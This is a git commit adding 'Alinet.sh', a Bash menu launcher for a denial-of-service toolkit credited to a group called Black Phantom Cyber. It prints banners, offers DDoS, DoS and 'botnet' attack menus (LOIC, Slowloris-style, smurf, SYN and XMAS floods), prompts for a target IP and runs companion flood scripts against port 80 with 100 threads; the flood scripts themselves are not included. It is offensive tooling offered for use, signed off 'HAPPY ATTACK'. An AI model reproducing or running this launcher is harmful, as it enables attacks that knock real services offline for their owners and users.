0ed785a33c75469c363b312ede0b9e3cfd679e92
wenNEx <62302102+wenNEx@users.noreply.github.com>
2020-03-18 01:20:49 +0700

    Update and rename README.md to Alinet.sh

---
+++ Alinet.sh
@@ -0,0 +1,182 @@
+#Denial Of Service and ddos attack via alinet
+#Dibuat tanggal 21-04-2019
+#Made in indonesian
+#creator 2eus666GH05T/MR.SPOON 
+#team BLACK PHANTOM CYBER
+#contac bpcofficial95@gmail.com
+#NO COPYRIGHT ©® 2019 (ALINET)
+clear
+blue='\033[34;1m'
+green='\033[32;1m'  
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'                                           
+yellow='\033[33;1m'
+clear
+toilet -f standard "ALINeT" -F gay
+echo
+echo $green"==========================================="
+echo $red"DoS AND DDoS ATTACK LAUCH VIA TOOL ALINET"
+echo $green"==========================================="
+echo $red"===    ===    ===    ===   ===    ===   ==="
+echo $white"===    ===    ===    ===   ===    ===   ==="
+            echo $red"        ____...------------...____"
+            echo $red"   _:-:: /o/ ---------------- \o\_ :-:_" 
+            echo $green" .:   / /   SC BY MR_AWEN    \ \     :."
+            echo $red" |=====/o/======================\o\=====|" 
+            echo $red" |____/_/________..____..________\_\____|" 
+            echo $red" :   _/ \_     :_oβ:__:βo_:     _/ \_   :" 
+            echo $green" \__/_____\####/ALINET V2.4.0/####/__\__/"
+            echo $yellow"  |===\!/========================\!/===|"
+            echo $red"  |   |=|          .---.         |=|   |" 
+            echo $red"  |===|o|=========/     \========|o|===|  " 
+            echo $red"  |   | |         \() ()/        | |   |  " 
+            echo $red"  |===|o|======{:-.) A (.-:}=====|o|===|  " 
+            echo $red"  | __/ \__     :-.\uuu/.-:    __/ \__ |  " 
+            echo $red"  |==== .:.:::.:.====|====.:.:::.:.====|  " 
+            echo $red"  |  _\o/   __  {.: __  :.} _   _\o/  _|  " 
+            echo $red"  ''''''''''''''''''''''''''''''''''''''  " 
+echo $yellow"BLACK PHANTOM CYBER  USER-AGENT=106 BOT=368"
+echo $green"==========================================="
+echo $white"                  MENU                     "
+echo $green"============================================="
+echo $red"[1].DDOS ATTACK.   #ALINET VERSION V.2.4.0"
+echo $red"[2].DoS ATTACK.    #https://alinet63.blogspot.com"
+echo $red"[3].BOTNET ATTACK. #bpcofficial95@gmail.com"
+echo $red"[4].EXIT TOOL.     #    HAPPY ATTACK"
+echo $green"============================================="
+echo $white "╭─"$yellow"ALINET@USER"
+read -p " ╰─> " pil
+
+#DDOS
+
+if [ $pil = 1 ] || [ $pil = 1 ]
+then
+clear
+toilet -f slant "LIST DDOS" -F metal
+echo
+echo $green"============================================="
+echo $yellow"[1].LOIC"
+echo $yellow"[2].AMNESIA"
+echo $yellow"[3].PING OF DEADHT"
+echo $yellow"[4].POF ARMAGEDON LEVEL"
+echo $yellow"[5].LORIS"
+echo $green"============================================="
+echo $white "╭─"$yellow"ALINET@DDOS"
+read -p " ╰─> " ddos
+fi
+
+if [ $ddos = 1 ] || [ $ddos = 1 ]
+then
+clear
+python2 LO1C.py
+fi
+
+if [ $ddos = 2 ] || [ $ddos = 2 ]
+then
+clear
+perl Amnesia.pl
+fi
+
+if [ $ddos = 3 ] || [ $ddos = 3 ]
+then
+clear
+python2 SPOONDDOS.py
+fi
+
+if [ $ddos = 4 ] || [ $ddos = 4 ]
+then
+clear
+python2 arma.py
+fi
+
+if [ $ddos = 5 ] || [ $ddos = 5 ]
+then
+clear
+python lor.py
+fi
+
+
+#DOS
+
+
+
+if [ $pil = 2 ] || [ $pil = 2 ]
+then
+clear
+toilet -f slant "LIST DOS" -F metal
+echo
+echo $green"============================================="
+echo $yellow"[1].WIN(TERMUX)"
+echo $yellow"[2].SUMFR(PC)"
+echo $yellow"[3].UFOSYN(PC)"
+echo $yellow"[4].XMAS(PC)"
+echo $yellow"[5].ANDROMEDA(TERMUX)"
+echo $green"============================================="
+echo $white "╭─"$yellow"ALINET@DOS"
+read -p " ╰─> " dos
+fi
+
+
+
+if [ $dos = 1 ] || [ $dos = 1 ]
+then
+clear
+toilet -f slant "WIN"
+echo $red"MASUKAN IP TARGET"
+read -p "===>" win
+python win.32.64.NT.py -s$win -p80 -t100
+fi
+
+
+
+if [ $dos = 2 ] || [ $dos = 2 ]
+then
+clear
+python smurf.py
+fi
+
+if [ $dos = 3 ] || [ $dos = 3 ]
+then
+clear
+python ufosyn.py
+fi
+
+if [ $dos = 4 ] || [ $dos = 4 ]
+then
+clear
+python xmas.py
+fi
+
+if [ $dos = 5 ] || [ $dos = 5 ]
+then
+clear
+toilet -f slant "DROID RX" |lolcat
+echo $red"MASUKAN IP TARGET"
+read -p "===>" ipt
+clear
+echo
+python andromeda.py -s$ipt -p80 -t100
+fi
+
+
+
+#BOTNET
+
+if [ $pil = 3 ] || [ pil = 3 ]
+then
+clear
+toilet -f slant " BOTNET" -F gay
+echo $red"MASUKAN IP TARGET"
+read -p "==>" bot
+python Botnet.py -s$bot -p80 -t100
+fi
+
+#exit
+
+if [ $pil = 4 ] || [ pil = 4 ]
+then
+clear
+exit
+fi
